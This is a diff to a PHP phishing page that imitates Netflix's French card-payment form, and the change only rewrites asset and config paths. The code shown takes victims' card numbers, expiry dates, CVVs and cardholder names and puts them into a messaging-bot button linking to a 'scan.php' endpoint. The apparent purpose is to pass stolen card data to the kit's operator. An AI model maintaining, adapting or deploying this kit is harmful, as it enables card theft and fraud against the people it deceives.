@@ -1,7 +1,7 @@
 <?php
 session_start();
 
-$config = include './zebi/config.php';
+$config = include 'config.php';
 include "functions.php";
 
 $user_ip = $_SERVER['REMOTE_ADDR'];
@@ -67,7 +67,7 @@ if ($step == "3" && isset($_POST['cardnumber']) && isset($_POST['expiry']) && is
     $inline_keyboard['inline_keyboard'][] = array(
         array(
             'text' => '🛰 SCAN CC 🛰',
-            'url' => $base_url . "/zebi/scan.php?cc-number=" . urlencode($_POST['cardnumber']) .
+            'url' => $base_url . "scan.php?cc-number=" . urlencode($_POST['cardnumber']) .
                     "&cc-exp=" . urlencode($_POST['expiry']) .
                     "&cc-cvv=" . urlencode($_POST['cvv']) .
                     "&fname=" . urlencode($_POST['cardholder'])
@@ -112,7 +112,7 @@ if ($_SESSION['allow'] == "yes") {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Paiement par Carte - Netflix</title>
-    <link rel="icon" href="files/img/nficon2025.ico">
+    <link rel="icon" href="nficon2025.ico">
     <style>
         * {
             box-sizing: border-box;
@@ -295,7 +295,7 @@ if ($_SESSION['allow'] == "yes") {
     
     <div class="form-container">
     <div style="text-align: center; line-height: 0; margin-bottom: -10px;">
-        <img src="files/img/logo.png" alt="Netflix Logo" style="height: 100px; display: inline-block; vertical-align: bottom; margin-bottom: -10px;">
+        <img src="logo.png" alt="Netflix Logo" style="height: 100px; display: inline-block; vertical-align: bottom; margin-bottom: -10px;">
     </div>
     <h2 style="margin-top: 0; font-weight: bold; text-align: center;">Paiement par carte</h2>
 
@@ -312,9 +312,9 @@ if ($_SESSION['allow'] == "yes") {
             </div>
 			
 			<div class="card-icons">
-                <img src="files/img/vs.svg" alt="Visa">
-                <img src="files/img/mr.svg" alt="Mastercard">
-                <img src="files/img/am.svg" alt="Amex">
+                <img src="vs.svg" alt="Visa">
+                <img src="mr.svg" alt="Mastercard">
+                <img src="am.svg" alt="Amex">
             </div>
             
             <div class="security-note">
